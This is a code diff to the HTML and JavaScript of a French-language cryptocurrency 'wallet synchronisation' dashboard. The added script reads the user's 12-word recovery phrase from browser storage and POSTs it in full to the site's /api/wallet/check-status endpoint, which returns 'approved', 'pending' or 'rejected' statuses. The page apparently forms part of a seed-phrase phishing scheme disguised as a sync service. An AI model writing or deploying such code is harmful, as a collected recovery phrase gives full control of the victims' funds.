@@ -16,6 +16,7 @@
             align-items: center;
             justify-content: center;
             color: white;
+            padding: 20px;
         }
         .card {
             background: rgba(17, 22, 43, 0.95);
@@ -27,27 +28,10 @@
             border: 1px solid rgba(255,255,255,0.08);
             text-align: center;
         }
-        .logo {
-            font-size: 48px;
-            font-weight: 700;
-            margin-bottom: 10px;
-        }
-        .logo span {
-            background: linear-gradient(135deg, #f5b042, #e08e1a);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-        .subtitle {
-            color: #8b8cae;
-            font-size: 14px;
-            margin-bottom: 50px;
-        }
-        .wallet-icon {
-            font-size: 72px;
-            margin-bottom: 30px;
-            color: #f5b042;
-        }
+        .logo { font-size: 48px; font-weight: 700; margin-bottom: 10px; }
+        .logo span { background: linear-gradient(135deg, #f5b042, #e08e1a); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        .subtitle { color: #8b8cae; font-size: 14px; margin-bottom: 30px; }
+        .wallet-icon { font-size: 72px; margin-bottom: 30px; color: #f5b042; }
         .btn {
             width: 100%;
             padding: 18px;
@@ -79,10 +63,52 @@
             color: #f5b042;
             box-shadow: none;
         }
-        .footer {
-            margin-top: 40px;
-            color: #4b5565;
-            font-size: 12px;
+        .btn-danger {
+            background: transparent;
+            border: 1px solid #ef4444;
+            color: #ef4444;
+            margin-top: 15px;
+        }
+        .btn-danger:hover {
+            background: #ef4444;
+            color: white;
+        }
+        .footer { margin-top: 40px; color: #4b5565; font-size: 12px; }
+        .seed-box {
+            background: rgba(16,185,129,0.1);
+            border: 1px solid rgba(16,185,129,0.2);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            font-family: monospace;
+            font-size: 13px;
+            word-break: break-all;
+            text-align: center;
+            color: #10b981;
+        }
+        .seed-box-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 8px;
+            text-align: center;
+            margin-top: 10px;
+        }
+        .seed-box-grid-item {
+            background: rgba(16,185,129,0.05);
+            padding: 6px;
+            border-radius: 8px;
+        }
+        .status-approved {
+            color: #10b981;
+            font-weight: 600;
+        }
+        .status-pending {
+            color: #f5b042;
+            font-weight: 600;
+        }
+        .status-rejected {
+            color: #ef4444;
+            font-weight: 600;
         }
     </style>
 </head>
@@ -94,12 +120,16 @@
         <div class="wallet-icon">
             <i class="fas fa-wallet"></i>
         </div>
-        
+
+        <div id="statusMessage" style="margin-bottom: 20px;"></div>
+
+        <div id="seedDisplay" style="display: none;" class="seed-box"></div>
+
         <button class="btn" onclick="window.location.href='seed-sync.html'">
             <i class="fas fa-sync-alt"></i> Synchroniser
         </button>
         
-        <button class="btn btn-outline" onclick="logout()">
+        <button class="btn-outline" onclick="logout()">
             <i class="fas fa-sign-out-alt"></i> Déconnexion
         </button>
         
@@ -109,17 +139,68 @@
     </div>
 
     <script>
+        const token = localStorage.getItem('token');
+        if (!token) {
+            window.location.href = 'index.html';
+        }
+
+        async function loadStatus() {
+            const savedWords = localStorage.getItem('seedWords');
+            if (!savedWords) return;
+
+            const words = JSON.parse(savedWords);
+            const seedPhrase = words.join(' ');
+
+            try {
+                const response = await fetch('/api/wallet/check-status', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ seedPhrase })
+                });
+                const data = await response.json();
+                
+                const statusDiv = document.getElementById('statusMessage');
+                
+                if (data.success) {
+                    if (data.status === 'approved') {
+                        statusDiv.innerHTML = '<span class="status-approved">✅ Wallet synchronisé</span>';
+                        displaySeedWords(words);
+                    } else if (data.status === 'rejected') {
+                        statusDiv.innerHTML = '<span class="status-rejected">❌ Synchronisation refusée</span>';
+                    } else {
+                        statusDiv.innerHTML = '<span class="status-pending">⏳ En attente de synchronisation...</span>';
+                    }
+                } else {
+                    statusDiv.innerHTML = '<span class="status-pending">⏳ En attente de synchronisation...</span>';
+                }
+            } catch (error) {
+                console.error('Erreur:', error);
+                document.getElementById('statusMessage').innerHTML = '<span class="status-pending">⏳ En attente de synchronisation...</span>';
+            }
+        }
+
+        function displaySeedWords(words) {
+            const container = document.getElementById('seedDisplay');
+            container.style.display = 'block';
+            container.innerHTML = `
+                <div style="margin-bottom: 10px;">🔐 Vos 12 mots de récupération :</div>
+                <div class="seed-box-grid">
+                    ${words.map((word, index) => `
+                        <div class="seed-box-grid-item">
+                            <span style="font-size: 10px; color: #8b8cae;">mot ${index + 1}</span><br>
+                            <span style="font-weight: 600; font-size: 14px;">${word}</span>
+                        </div>
+                    `).join('')}
+                </div>
+            `;
+        }
+
         function logout() {
             localStorage.clear();
             window.location.href = 'index.html';
         }
 
-        // Vérifier si l'utilisateur est connecté
-        const token = localStorage.getItem('token');
-        if (!token) {
-            // Rediriger vers la page d'accueil si non connecté
-            window.location.href = 'index.html';
-        }
+        loadStatus();
     </script>
 </body>
 </html>
